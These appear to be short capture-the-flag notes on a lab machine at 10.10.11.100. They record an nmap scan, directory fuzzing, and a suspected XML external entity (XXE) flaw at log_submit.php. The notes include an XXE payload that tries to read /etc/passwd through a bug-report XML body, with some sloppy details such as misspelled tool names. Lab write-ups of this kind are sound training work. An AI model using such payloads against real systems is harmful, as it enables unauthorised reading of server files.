start with nmap


22
80

***

fuff

/resources
/index.php
/http://10.10.11.100/log_submit.php # may be xxe here

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
		<!DOCTYPE reset [
		<!ENTITY ignite SYSTEM "file:///etc/passwd">
		]>
		<bugreport>
		<title>$ignite</title>
		<cwe>2021-224433</cwe>
		<cvss>4.5</cvss>
		<reward>100</reward>
		</bugreport>
```